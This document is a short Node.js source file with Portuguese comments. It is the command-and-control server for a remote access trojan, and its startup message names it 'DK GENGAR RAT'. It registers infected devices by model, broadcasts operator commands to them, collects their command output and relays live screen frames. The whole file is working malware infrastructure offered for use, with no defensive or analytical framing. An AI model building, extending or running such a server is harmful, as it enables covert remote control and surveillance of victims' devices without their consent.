
const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Serve o arquivo index.html como página principal
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

io.on("connection", (socket) => {
    console.log("Nova conexão Socket.io");

    socket.on("register", (data) => {
        console.log("Dispositivo registrado:", data.model);
        io.emit("new_device", data);
    });

    socket.on("command", (data) => {
        console.log("Comando enviado:", data.cmd);
        socket.broadcast.emit("command", data);
    });

    socket.on("result", (data) => {
        console.log("Resultado recebido:", data.msg);
        io.emit("server_log", data.msg);
    });

    socket.on("screen_frame", (frame) => {
        io.emit("screen_frame", frame);
    });

    socket.on("disconnect", () => {
        console.log("Conexão encerrada");
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log("Servidor DK GENGAR RAT rodando na porta " + PORT);
});
